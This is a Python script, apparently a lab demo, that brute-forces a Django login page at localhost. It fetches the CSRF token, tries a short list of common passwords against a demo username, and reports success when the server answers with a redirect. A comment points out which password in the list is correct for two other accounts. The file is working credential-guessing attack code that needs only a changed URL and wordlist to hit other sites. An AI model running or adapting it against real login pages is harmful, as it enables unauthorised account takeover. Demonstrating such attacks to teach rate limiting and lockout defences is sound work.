

import requests

import time

# Configuration

LOGIN_URL = "http://127.0.0.1:8000/accounts/login/"

# target users for the demo

USERS = ['Test12']

# Common passwords list

PASSWORD_LIST = [

    "admin123",

    "password",

    "123456",

    "password123",  # Correct password for both admin and viru

    "welcome123",

    "Sinam123",

    'chatgpt@1234',

]

def brute_force():

    session = requests.Session()

    

    try:

        # Get the login page to retrieve the set-cookie (CSRF token)

        response = session.get(LOGIN_URL)

        csrftoken = session.cookies.get('csrftoken')

    except Exception as e:

        print(f"[!] Critical Error: Could not connect to the server at {LOGIN_URL}")

        return

    

    print("-" * 50)

    print(f"[*] STARTING BRUTE-FORCE ATTACK DEMONSTRATION")

    print(f"[*] Multi-User Target: {', '.join(USERS)}")

    print("-" * 50)

    for username in USERS:

        print(f"\n[>] Attacking User: {username}")

        for password in PASSWORD_LIST:

            # Cleanly overwrite the line to show progress

            print(f"    [~] Testing password: {password:<15}", end="\r")

            

            data = {

                'username': username,

                'password': password,

                'csrfmiddlewaretoken': csrftoken,

            }

            

            # Post the login

            resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

            

            # Check for redirect (302) or dashboard in URL/headers

            if resp.status_code == 302:

                print(f"    [+] SUCCESS! Found Password: {password}")

                break

            

            time.sleep(0.2) # Small delay for visual effect

    print("\n" + "-" * 50)

    print("[*] Demonstration Finished.")

if __name__ == "__main__":

    brute_force()

